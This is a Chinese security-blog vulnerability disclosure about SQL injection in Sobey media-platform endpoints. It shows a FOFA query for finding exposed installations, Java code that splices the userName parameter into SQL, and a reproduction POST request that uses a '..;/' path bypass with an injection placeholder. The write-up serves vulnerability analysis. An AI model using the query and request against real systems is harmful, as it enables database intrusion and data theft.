---
title: "索贝融媒体 /sobey-mchEditor/mch/Jzt/Business 多个SQL注入漏洞"
source: https://mrxn.net/jswz/sobey-Jzt-Business-userBusinessNumList-sqli.html
asset_dir: assets/索贝融媒体-sobey-mcheditormchjztbusiness-多个sql注入漏洞
---

# 索贝融媒体 /sobey-mchEditor/mch/Jzt/Business 多个SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/9/19 08:32
- 656浏览
- [0评论](#comment)
- 29分钟阅读

深入探索

云安全解决方案

计算机安全

代码安全审计

---

# 漏洞简介

索贝产品中的 /sobey-mchEditor/mch/jztEditorScore/queryEditorScoreRank、userBusinessNumListDetial、countBusinessNumList接口存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，攻击者可以通过构造恶意的SQL语句，获取数据库中的敏感信息，甚至可能导致数据库被完全控制。

SQL注入检测工具

# 影响版本

# fofa语法

> icon\_hash="689611853"||app="SOBEY-融媒体" || body="You need to enable JavaScript to run this app" && header="Sobey"

# 漏洞分析

深入探索

安全工具开发

SQL

漏洞扫描器

## queryEditorScoreRank

根据漏洞信息看下`mch/jztEditorScore/queryEditorScoreRank`的实现逻辑

```
@RestController
@RequestMapping({"/mch/Jzt/Business"})
public class JztBusinessController extends BaseController {
    private static List<Integer> ARTICLE_PUBLISH_STATUS_LIST = new ArrayList();
    private static List<Integer> ARTICLE_PUBLISH1_STATUS_LIST = new ArrayList();
    public static final String BUSSINESS_NUM_TYPE_COMPLETE = "COMPLETE_NUM";
    public static final String BUSSINESS_NUM_TYPE_USE = "USE_NUM";

@RequestMapping(
    value = {"userBusinessNumList"},
    method = {RequestMethod.POST}
)
public Response userBusinessNumList(@RequestParam("token") String token, @RequestParam("siteCode") String siteCode, @RequestParam("startTime") Long startTime, @RequestParam("endTime") Long endTime, @RequestParam(value = "userCodes",required = false) List<String> userCodes, @RequestParam(value = "userName",required = false) String userName) {
......
stringBuffer.append(" ) y WHERE y.idz = zcncommoneditorscore.relativeArticleId  and zcncommoneditorscore.isCoverd = 0 ");
stringBuffer.append(" and catalogname != 'other' ");
if (StringUtils.isNotEmpty(userName)) {
    try {
        URLDecoder.decode(userName, "UTF-8");
    } catch (UnsupportedEncodingException e) {
        e.printStackTrace();
    }

    stringBuffer.append(String.format(" and zcncommoneditorscore.targetUserCode in (SELECT targetUserCode from zcncommoneditorscore where targetUserName like '%%%s%%' ) ", userName));
} else if (CollectionUtils.isNotEmpty(userCodes)) {
    SchemaSQLUtil.appendInCondition(stringBuffer, "targetUserCode", userCodes);
}

stringBuffer.append(" GROUP BY userCode, ID, y.catalogname) tem GROUP BY userCode,channelName  ");
List<Map<String, Object>> tmpList = (new QueryBuilder(stringBuffer.toString(), args.toArray())).executeListMap();
```

深入探索

漏洞预警服务

物流软件安全

网络安全培训

参数`userName` 使用`String.format`格式化后，无任何过滤或校验处理，被直接拼接到qb这个sql语句中执行，从而造成了[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。参数 `userCodes`使用的是`appendInCondition`方法， 参考之前的漏洞分析部分，也是直接拼接。

代码安全审计

[![索贝融媒体 /sobey-mchEditor/mch/Jzt/Business 多个SQL注入漏洞](images/img-001-406547fa1fe1.webp)](https://image.mrxn.net/659bd08d9aa943c8a4ec157ea2feb15c.webp)

## userBusinessNumListDetial

漏洞原因和上面的`queryEditorScoreRank` 是一样的，详情看图就明白了

漏洞扫描服务

[![索贝融媒体 /sobey-mchEditor/mch/Jzt/Business 多个SQL注入漏洞](images/img-002-e83c9fea0cdb.webp)](https://image.mrxn.net/19ef8bc5ccd34666803015d83d335e7b.webp)

## countBusinessNumList

[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)原因同样如此

编程

[![索贝融媒体 /sobey-mchEditor/mch/Jzt/Business 多个SQL注入漏洞](images/img-003-d84b9975f9eb.webp)](https://image.mrxn.net/c4c389202a92444eafebc0e1c8758ac1.webp)

## countPtBusinessNumList

亦如此！

[![索贝融媒体 /sobey-mchEditor/mch/Jzt/Business 多个SQL注入漏洞](images/img-004-bf98ce78e7b6.webp)](https://image.mrxn.net/62efafc5619243958226c1952a33dc8e.webp)

# 漏洞复现

## userBusinessNumList

```
POST /sobey-mchEditor/js/..;/mch/Jzt/Business/userBusinessNumList HTTP/1.1
Host: sobey.mrxn.net
Content-Type: application/x-www-form-urlencoded

endTime={{timestamp()}}&siteCode=&startTime={{timestamp()}}&token=&userCode=admin&userName='SQLI_POC
```

[![索贝融媒体 /sobey-mchEditor/mch/Jzt/Business 多个SQL注入漏洞](images/img-005-2d23685f5071.webp)](https://image.mrxn.net/93a0a6cffeb541d3b2f085af1032bd19.webp)

成功通过报错[注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)在响应回显数据库用户信息

漏洞扫描服务

## userBusinessNumListDetial

[![索贝融媒体 /sobey-mchEditor/mch/Jzt/Business 多个SQL注入漏洞](images/img-006-50245ccb7a4b.webp)](https://image.mrxn.net/4d5071628c0d4c969c04cda55b138804.webp)

也是成功通过[报错注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)在响应回显数据库用户信息

## countBusinessNumList

参考上面

## countPtBusinessNumList

参考上面

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#0day](https://mrxn.net/tag/0day)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [4.1.queryEditorScoreRank](#toc-4-1-)
- [4.2.userBusinessNumListDetial](#toc-4-2-)
- [4.3.countBusinessNumList](#toc-4-3-)
- [4.4.countPtBusinessNumList](#toc-4-4-)
- [5.漏洞复现](#toc-5-)
- [5.1.userBusinessNumList](#toc-5-1-)
- [5.2.userBusinessNumListDetial](#toc-5-2-)
- [5.3.countBusinessNumList](#toc-5-3-)
- [5.4.countPtBusinessNumList](#toc-5-4-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
